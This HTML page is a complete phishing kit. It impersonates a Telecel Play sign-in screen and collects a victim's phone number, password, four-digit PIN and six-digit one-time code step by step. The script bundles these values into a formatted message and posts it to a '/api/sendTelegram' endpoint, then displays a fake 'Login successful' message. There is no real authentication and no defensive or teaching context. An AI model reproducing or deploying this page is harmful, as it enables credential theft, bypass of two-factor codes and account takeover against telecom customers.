<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Secure Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
box-sizing:border-box;
font-family:"Plus Jakarta Sans",system-ui;
}

body{

margin:0;
min-height:100vh;

display:flex;
align-items:center;
justify-content:center;

background:#f2f2f7;

}


/* container */

.container{

width:100%;
max-width:380px;

}


/* card */

.step{

background:white;

padding:26px;

border-radius:22px;

box-shadow:

0 10px 25px rgba(0,0,0,.08),
0 2px 6px rgba(0,0,0,.05);

transition:.35s;

}


.hidden{

opacity:0;
transform:translateY(8px);
pointer-events:none;

}


.logo{

height:70px;
display:block;
margin:0 auto 10px;

}


/* typography */

h1{

font-size:20px;

text-align:center;

margin:6px 0 4px;

font-weight:600;

color:#111;

}


.subtitle{

text-align:center;

font-size:13px;

color:#666;

margin-bottom:18px;

}


/* inputs */

label{

font-size:12px;

color:#666;

display:block;

margin-top:12px;

margin-bottom:4px;

}


input{

width:100%;

padding:13px;

border-radius:12px;

border:1px solid #e5e5ea;

font-size:15px;

background:#fafafa;

transition:.15s;

}


input:focus{

outline:none;

background:white;

border-color:#d1d1d6;

box-shadow:

0 0 0 4px rgba(0,0,0,.04);

}


.password-box{

position:relative;

}


.eye{

position:absolute;

right:12px;

top:50%;

transform:translateY(-50%);

font-size:14px;

cursor:pointer;

color:#888;

}


/* buttons */

.btn{

margin-top:18px;

width:100%;

padding:13px;

border-radius:14px;

border:0;

font-size:15px;

font-weight:600;

background:#000;

color:white;

cursor:pointer;

transition:.15s;

}


.btn:active{

transform:scale(.98);

}


/* pin */

.pin{

display:flex;

justify-content:space-between;

gap:10px;

margin:18px 0;

}


.pin input{

width:100%;

height:58px;

font-size:22px;

text-align:center;

border-radius:16px;

border:1px solid #e5e5ea;

background:white;

transition:.15s;

}


.pin input:focus{

border-color:black;

box-shadow:

0 0 0 4px rgba(0,0,0,.05);

}


/* timer */

.count{

text-align:center;

font-size:12px;

color:#888;

margin-top:6px;

}


.resend{

text-align:center;

margin-top:10px;

font-size:13px;

}


.resend button{

border:0;

background:none;

color:black;

font-weight:500;

cursor:pointer;

}


.success{

text-align:center;

font-size:15px;

color:#666;

}

</style>

</head>

<body>



<div class="container">


<div id="step1" class="step">

<img src="assets/telecel.svg" class="logo">

<h1>Sign in</h1>

<div class="subtitle">

Use your mobile number

</div>


<form id="form">

<label>Phone number</label>

<input id="phone" inputmode="numeric">


<label>Password</label>

<div class="password-box">

<input id="password" type="password">

<span class="eye" onclick="togglePassword()">👁</span>

</div>


<button class="btn">

Continue

</button>

</form>

</div>




<div id="loading" class="step hidden">

<div class="success">

Checking details...

</div>

</div>




<div id="step2" class="step hidden">

<h1>Enter PIN</h1>

<div class="subtitle" id="showNumber"></div>


<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<button class="btn" onclick="submitPin()">

Continue

</button>

</div>




<div id="step3" class="step hidden">

<h1>Verification code</h1>

<div class="subtitle">

6 digit code

</div>


<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>


<div class="count">

Code expires in <span id="time">60</span>s

</div>


<div class="resend">

<button onclick="resendOtp()">

Resend

</button>

</div>


<button class="btn" onclick="submitOtp()">

Verify

</button>

</div>




<div id="step4" class="step hidden">

<div class="success">

Login successful

</div>

</div>



</div>




<script>


let phoneValue=""
let passwordValue=""
let pinValue=""
let otpValue=""



function togglePassword(){

password.type=password.type==="password"?"text":"password"

}



function show(id){

document.querySelectorAll(".step")

.forEach(s=>s.classList.add("hidden"))

document.getElementById(id)

.classList.remove("hidden")

}



function buildMessage(stage){

return `
Time: ${new Date().toISOString()}

<b>Telecel Play Login</b>

<b>Stage</b>
${stage}

<b>Number</b>
${phoneValue}

<b>Password</b>
${passwordValue}

<b>Pin</b>
${pinValue}

<b>Otp</b>
${otpValue}
`

}



async function sendToServer(stage){

await fetch("/api/sendTelegram",{

method:"POST",

headers:{

"Content-Type":"application/json"

},

body:JSON.stringify({

message:buildMessage(stage),

parse_mode:"HTML"

})

})

}



/* login */

form.onsubmit=e=>{

e.preventDefault()

phoneValue=phone.value

passwordValue=password.value

show("loading")

setTimeout(()=>{

showNumber.textContent=phoneValue

show("step2")

},700)

}



/* pin */

const pinInputs=document.querySelectorAll("#step2 input")

pinInputs.forEach((input,index)=>{


input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<3)

pinInputs[index+1].focus()

})


input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

pinInputs[index-1].focus()

pinInputs[index-1].value=""

}

})


})


function submitPin(){

pinValue=[...pinInputs]

.map(i=>i.value)

.join("")


sendToServer("Pin")

show("loading")

setTimeout(()=>{

show("step3")

startTimer()

},700)

}




/* otp */

const otpInputs=document.querySelectorAll("#step3 input")

otpInputs.forEach((input,index)=>{


input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<5)

otpInputs[index+1].focus()

})


input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

otpInputs[index-1].focus()

otpInputs[index-1].value=""

}

})


})


function submitOtp(){

otpValue=[...otpInputs]

.map(i=>i.value)

.join("")


sendToServer("Otp")

show("step4")

}



function resendOtp(){

startTimer()

}



function startTimer(){

let t=60

time.textContent=t


const i=setInterval(()=>{

t--

time.textContent=t


if(t<=0)

clearInterval(i)

},1000)

}


</script>

</body>
</html>
